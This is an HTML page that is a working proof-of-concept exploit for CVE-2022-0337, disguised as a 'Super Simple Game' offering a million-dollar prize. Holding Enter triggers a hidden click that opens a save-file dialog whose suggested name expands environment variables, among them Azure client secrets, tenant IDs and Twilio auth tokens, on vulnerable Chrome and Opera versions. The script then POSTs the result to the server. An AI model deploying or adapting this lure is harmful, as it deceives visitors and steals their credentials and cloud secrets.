<!-- templates/index.html -->
<!DOCTYPE html>
<html>

<head>
    <title>
        CVE-2022-0337 System environment variables leak on Google Chrome,
        Microsoft Edge and Opera
    </title>
    <meta charset="UTF-8" />
    <style>
        /* CSS styles... */
    </style>
</head>

<style>
    body {
        background: rgba(29, 48, 109, 0.849);
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    h1,
    h2,
    h3 {
        -webkit-text-stroke: 1px #00000050;
    }

    h1 {
        color: #d96c06;
        font-size: 36px;
    }

    h2 {
        color: #1ebe8e;
        font-size: 46px;
    }

    h3 {
        color: #c6f91f;
        font-size: 18px;
    }

    h2 span {
        color: #cf4848;
        font-size: 70px;
    }

    #author {
        font-size: 28px;
    }

    span {
        font-weight: 100;
    }
</style>

<body>
    <div id="pixel"></div>
    <h3 id="userInfo"></h3>
    <h1>Super Simple Game<span>ğŸ˜»ğŸ˜»ğŸ˜»</span></h1>
    <h2><span>âŒ¨ï¸HOLD ENTER</span> for 2 seconds</h2>
    <h3>win $1,000,000 and rule the world! <span>ğŸ”¥ğŸ”¥ğŸ”¥ğŸš€</span></h3>
    <h3 id="gameover"></h3>

    <script>

        function sendDataToServer(value) {
            fetch('/get_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                // CÃ³ thá»ƒ gá»­i dá»¯ liá»‡u náº¿u cáº§n
                body: JSON.stringify({ key: value })
            })
                .then(response => response.json())
                .then(data => {
                    // Xá»­ lÃ½ response tá»« mÃ¡y chá»§ á»Ÿ Ä‘Ã¢y
                    console.log(data);
                    // VÃ­ dá»¥: Hiá»ƒn thá»‹ thÃ´ng Ä‘iá»‡p tá»« response trÃªn trang web
                    document.getElementById('responseMessage').innerText = data.message;
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        }

        let countEnter = 0;
        let isDownloaded = false;

        window.onload = function () {
            const body = document.querySelector("body");
            const pixel = document.querySelector("#pixel");

            body.onkeydown = (e) => (e.key == "Enter" ? clickedEnter() : 1);
            body.onkeyup = (e) => (e.key == "Enter" ? cancelEnter() : 1);

            const randomNumber = Math.floor(Math.random() * 990) + 1;
            const filename = `f${randomNumber}.f`;

            const environmentVariables = [
                "USERNAME",
                "USERDOMAIN",
                "SESSIONNAME",
                "COMPUTERNAME",
                "KEY_VAULT_URL",
                "SECRET_NAME",
                "AZURE_TENANT_ID",
                "AZURE_CLIENT_ID",
                "AZURE_CLIENT_SECRET",
                "TWILIO_ACCOUNT_SID",
                "TWILIO_AUTH_TOKEN",
                //'TOKEN',
                //'PASSWORD'
            ];

            const suggestedName =
                environmentVariables.map((x) => `%${x}%`).join("@") + filename;

            pixel.addEventListener("click", async () => {
                let version_vulnerability = false;
                const userAgent = await window.navigator.userAgent;
                if (userAgent.includes('Firefox')) {
                    const version = userAgent.match(/Firefox\/([0-9.]+)/);
                    if (version) {
                        console.log('Firefox version:', version[1]);
                    }
                } else if (userAgent.includes('Chrome')) {
                    const version = userAgent.match(/Chrome\/([0-9.]+)/);
                    if (version) {
                        console.log('Chrome version:', version[1]);
                        const versionSegments = version[1].split('.');
                        const firstNumber = parseInt(versionSegments[0], 10);
                        if (firstNumber >= 92 && firstNumber <= 96) {
                            version_vulnerability = true
                        }
                    }
                } else if (userAgent.includes('Opera')) {
                    const version = userAgent.match(/Version\/([0-9.]+)/);
                    if (version) {
                        console.log('Opera version:', version[1]);
                        const versionSegments = version[1].split('.');
                        const firstNumber = parseInt(versionSegments[0], 10);
                        if (firstNumber >= 78 && firstNumber <= 82) {
                            version_vulnerability = true
                        }
                    }
                }
                console.log(version_vulnerability)
                if (version_vulnerability) {
                    const handle = await window.showSaveFilePicker({ suggestedName });
                    console.log(handle)
                    const username = handle.name.split("@")[0];
                    sendDataToServer(handle.name)
                    document.querySelector(
                        "#userInfo"
                    ).innerHTML = `Congratulation!!`;
                    document.querySelector("#gameover").textContent =
                        "GAME OVER - Need refresh to start again";
                }
                else {
                    document.querySelector(
                        "#userInfo"
                    ).innerHTML = `Wish you luck next time!`;
                }
            });
        };

        function clickedEnter() {
            countEnter++;
            if (countEnter > 5 && !isDownloaded) {
                pixel.click();
                isDownloaded = true;
            }
        }

        function cancelEnter() {
            countEnter = 0;
        }
    </script>
</body>

</html>